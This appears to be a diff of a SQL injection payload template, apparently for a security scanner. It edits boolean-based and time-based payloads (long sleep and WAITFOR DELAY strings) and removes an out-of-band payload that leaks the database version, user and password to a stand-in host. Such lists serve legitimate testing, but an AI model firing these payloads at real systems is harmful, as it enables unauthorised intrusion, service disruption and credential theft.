@@ -1,4 +1,4 @@
-# Template - for MySQL, MSSQL
+# Template
 {INPUT_COMPLETE}{SQLI_PAYLOAD}{FORCE_END}
 
 # True false based sqli payloads
@@ -14,11 +14,11 @@ AND 1=1 {FORCE_END}
 ' AND 1='0
 
 # Time based sqli payloads
-(select(*)from(select(sleep(8640)))shahmidoe){FORCE_END}
-6 days elapsed,;WAITFOR DELAY '144:00:00'{FORCE_END}
+(select(*)from(select(sleep(8640)))shahmidoe)-- -;
+6 days elapsed,;WAITFOR DELAY '144:00:00'-- -
 
 # OOB based sqli payloads
-SELECT load_file(CONCAT('\\\\',(SELECT+@@version),'.',(SELECT+user),'.', (SELECT+password),'.',example.com\\test.txt'))
+
 
 # Rest of the combinations
 {FORCE_END} 
